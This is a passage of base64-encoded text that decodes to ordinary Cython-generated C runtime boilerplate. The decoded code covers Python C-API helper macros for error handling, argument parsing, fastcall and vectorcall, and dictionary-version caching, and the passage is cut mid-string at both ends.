mFsdWUsIFB5T2JqZWN0ICoqdGIpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNgojZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSAoUHlfSU5DUkVGKGV4YyksIF9fUHl4X0VyclJlc3RvcmUoKGV4YyksIE5VTEwsIE5VTEwpKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSBQeUVycl9TZXROb25lKGV4YykKI2VuZGlmCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfQ2xlYXIoKSBQeUVycl9DbGVhcigpCiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIFB5RXJyX1NldE5vbmUoZXhjKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2godHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKSBQeU9iamVjdF9HZXRBdHRyKG8sbikKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5hbWUoUHlPYmplY3QgKm5hbWUp""OwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3Qgbik7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9NRVRIX0ZBU1RDQUxMCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTsKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cmluZy5oPgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpOwoKCiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJncywgaSkKI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9OZXdSZWYoX19QeXhfUHlUdXBsZV9HRVRfSVRFTShhcmdzLCBpKSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfWE5ld1JlZihQeVR1cGxlX0dldEl0ZW0oYXJncywgaSkpCiNlbmRpZgojZGVmaW5lIF9fUHl4X051bUt3YXJnc19WQVJBUkdTKGt3ZHMpIFB5RGljdF9TaXplKGt3ZHMpCiNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhhcmdzLCBuYXJncykgTlVMTAojZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUyhrdywga3d2YWx1ZXMsIHMpIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGt3LCBzKQojZGVmaW5lIF9fUHl4X0t3YXJnc0FzRGljdF9WQVJBUkdTKGt3LCBrd3ZhbHVlcykgUHlEaWN0X0NvcHkoa3cpCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoYXJncywgaSkgX19QeXhfTmV3UmVmKGFyZ3NbaV0pCiAgICAjZGVmaW5lIF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChrd2RzKSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGt3ZHMpCiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKGFyZ3MsIG5hcmdzKSAoKGFyZ3MpICsgKG5hcmdzKSkKICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCB8fCBDWVRIT05f""Q09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBDWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKTsKICAjZWxzZQogICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoa3csIGt3dmFsdWVzKSBfUHlTdGFja19Bc0RpY3Qoa3d2YWx1ZXMsIGt3KQogICNlbmRpZgojZWxzZQogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwgX19QeXhfQXJnUmVmX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMIF9fUHl4X051bUt3YXJnc19WQVJBUkdTCiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTCBfX1B5eF9HZXRLd1ZhbHVlX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMIF9fUHl4X0t3YXJnc0FzRGljdF9WQVJBUkdTCiNlbmRpZgojZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9WQVJBUkdTKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KGFyZ3MgKyBzdGFydCwgc3RvcCAtIHN0YXJ0KQojZWxzZQojZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9GQVNUQ0FMTChhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcCkKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwgUHlPYmplY3QqIGt3X25hbWUpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QYXJzZUtleXdvcmRzKAogICAgUHlPYmplY3QgKmt3ZHMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqa3dkczIsIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLCBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncwopOwoKCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbihjZnVuYywgc2VsZiwgYXJncylcCiAgICAoKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJn""cywga3dhcmdzKVwKICAgICgoUHlDRnVuY3Rpb25XaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywga3dhcmdzKQojZGVmaW5lIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBhcmdzLCBuYXJncylcCiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzLCBrd25hbWVzKVwKICAgICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShQeUNGdW5jdGlvbikoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcykKCgojaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwKI2RlZmluZSBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsKGZ1bmMsIGFyZ3MsIG5hcmdzKVwKICAgIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KChmdW5jKSwgKGFyZ3MpLCAobmFyZ3MpLCBOVUxMKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpOwojZW5kaWYKI2RlZmluZSBfX1B5eF9CVUlMRF9BU1NFUlRfRVhQUihjb25kKVwKICAgIChzaXplb2YoY2hhciBbMSAtIDIqIShjb25kKV0pIC0gMSkKI2lmbmRlZiBQeV9NRU1CRVJfU0laRQojZGVmaW5lIFB5X01FTUJFUl9TSVpFKHR5cGUsIG1lbWJlcikgc2l6ZW9mKCgodHlwZSAqKTApLT5tZW1iZXIpCiNlbmRpZgojaWYgIUNZVEhPTl9WRUNUT1JDQUxMCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwCiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiCiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpCiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZnJhbWUpICAoKGZyYW1lKS0+Zl9sb2NhbHNwbHVzKQojZWxzZQogIHN0YXRpYyBzaXplX3QgX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCA9IDA7CiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiCiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpXAogICAgKCh2b2lkKV9fUHl4X0JVSUxEX0FTU0VSVF9FWFBSKHNpemVvZihQeUZyYW1lT2JqZWN0KSA9PSBvZmZzZXRvZihQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpICsgUHlfTUVNQkVSX1NJWkUoUHlGcmFtZU9iamVjdCwgZl9sb2NhbHNwbHVzKSksXAogICAgICh2b2lkKShfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0ID0gKChzaXplX3QpUHlGcmFtZV9UeXBlLnRwX2Jhc2ljc2l6ZSkgLSBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fs""c3BsdXMpKSkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSlcCiAgICAoYXNzZXJ0KF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQpLCAoUHlPYmplY3QgKiopKCgoY2hhciAqKShmcmFtZSkpICsgX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCkpCiNlbmRpZgojZW5kaWYKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdykKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTsKI2VuZGlmCgoKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzLCBuYXJncykgIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KShuYXJncyksIE5VTEwpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICogY29uc3QqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKTsKCgp0eXBlZGVmIHN0cnVjdCB7CiAgICBQeU9iamVjdCAqdHlwZTsKICAgIFB5T2JqZWN0ICoqbWV0aG9kX25hbWU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAmJiBDWVRIT05fQVRPTUlDUwogICAgX19weXhfYXRvbWljX2ludF90eXBlIGluaXRpYWxpemVkOwojZW5kaWYKICAgIFB5Q0Z1bmN0aW9uIGZ1bmM7CiAgICBQeU9iamVjdCAqbWV0aG9kOwogICAgaW50IGZsYWc7Cn0gX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYykgewojaWYgIUNZVEhPTl9BVE9NSUNTCiAgICByZXR1cm4gMTsKI2Vsc2UKICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBleHBlY3RlZCA9IDA7CiAgICBpZiAoX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNmdW5jLT5pbml0aWFsaXplZCwgJmV4cGVjdGVkLCAxKSkgewogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIGV4cGVjdGVkOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNm""dW5jKSB7CiNpZiBDWVRIT05fQVRPTUlDUwogICAgX19weXhfYXRvbWljX3N0b3JlKCZjZnVuYy0+aW5pdGlhbGl6ZWQsIDIpOwojZW5kaWYKfQojZWxzZQojZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpIDIKI2RlZmluZSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpCiNlbmRpZgoKCkNZVEhPTl9VTlVTRUQKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZzEsIFB5T2JqZWN0ICphcmcyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKSAgX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpCiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwgaW50IGV4YWN0LAogICAgUHlfc3NpemVfdCBudW1fbWluLCBQeV9zc2l6ZV90IG51bV9tYXgsIFB5X3NzaXplX3QgbnVtX2ZvdW5kKTsKCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwojZGVmaW5lIF9fUFlYX0RJQ1RfVkVSU0lPTl9JTklUICAoKFBZX1VJTlQ2NF9UKSAtMSkKI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoKChQeURpY3RPYmplY3QqKShkaWN0KSktPm1hX3ZlcnNpb25fdGFnKQojZGVmaW5lIF9fUFlYX1VQREFURV9ESUNUX0NBQ0hFKGRpY3QsIHZhbHVlLCBjYWNoZV92YXIsIHZlcnNpb25fdmFyKVwKICAgICh2ZXJzaW9uX3ZhcikgPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpO1wKICAgIChjYWNoZV92YXIpID0gKHZhbHVlKTsKI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkge1wKICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1wKICAgIHN0YXRpYyBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSBOVUxMO1wKICAgIGlmIChsaWtlbHkoX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihESUNUKSA9PSBfX3B5eF9kaWN0X3ZlcnNpb24pKSB7XAogICAgICAgIChWQVIpID0gX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XAogICAgfSBlbHNlIHtcCiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IChMT09LVVApO1wKICAgICAgICBfX3B5eF9kaWN0X3ZlcnNpb24g""PSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKERJQ1QpO1wKICAgIH1cCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUFlfVUlOVDY0X1QgX19QeXhfZ2V0X3RwX2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUFlfVUlOVDY0X1QgX19QeXhfZ2V0X29iamVjdF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9vYmplY3RfZGljdF92ZXJzaW9uX21hdGNoZXMoUHlPYmplY3QqIG9iaiwgUFlfVUlOVDY0X1QgdHBfZGljdF92ZXJzaW9uLCBQWV9VSU5UNjRfVCBvYmpfZGljdF92ZXJzaW9uKTsKI2Vsc2UKI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoMCkKI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcikKI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkgIChWQVIpID0gKExPT0tVUCk7CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgIGRvIHtcCiAgICBzdGF0aWMgUFlfVUlOVDY0X1QgX19weXhfZGljdF92ZXJzaW9uID0gMDtcCiAgICBzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gTlVMTDtcCiAgICAodmFyKSA9IChsaWtlbHkoX19weXhfZGljdF92ZXJzaW9uID09IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCkpKSA/XAogICAgICAgIChsaWtlbHkoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpID8gX19QeXhfTmV3UmVmKF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKSA6IF9fUHl4X0dldEJ1aWx0aW5OYW1lKG5hbWUpKSA6XAogICAgICAgIF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUsICZfX3B5eF9kaWN0X3ZlcnNpb24sICZfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSk7XAp9IHdoaWxlKDApCiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZVVuY2FjaGVkKHZhciwgbmFtZSkgIGRvIHtcCiAgICBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb247XAogICAgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlO1wKICAgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSwgJl9fcHl4X2RpY3RfdmVyc2lvbiwgJl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcCn0gd2hpbGUoMCkKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShQeU9iamVjdCAqbmFtZSwgUFlfVUlOVDY0X1QgKmRpY3RfdmVyc2lvbiwgUHlPYmplY3QgKipkaWN0X2NhY2hlZF92YWx1ZSk7CiNlbHNlCiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpCiNkZWZpbmUgX19QeXhf""R2V0TW9kdWxlR2xvYmFsTmFtZVVuY2FjaGVkKHZhciwgbmFtZSkgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lKTsKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUocywgZikgKFwKICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlwKICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpCiNlbGlmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUocywgZikgKFwKICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlwKICAgICAgICBsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QocykpID8gUHlMb25nX1R5cGUudHBfcmVwcihzKSA6XAogICAgICAgIGxpa2VseShQeUZsb2F0X0NoZWNrRXhhY3QocykpID8gUHlGbG9hdF9UeXBlLnRwX3JlcHIocykgOlwKICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2VuZGlmCgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfSm9pbihQeU9iamVjdCoqIHZhbHVlcywgUHlfc3NpemVfdCB2YWx1ZV9jb3VudCwgUHlfc3NpemVfdCByZXN1bHRfdWxlbmd0aCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKTsKCgpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pOwojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgUHlPYmplY3RfVmVjdG9yY2FsbAojZWxzZQojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBfUHlPYmplY3RfVmVjdG9yY2FsbAojZW5kaWYKI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIFB5VHVwbGVfTmV3KG4pCnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pOwpzdGF0aWMgaW50IF9fUHl4""X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2J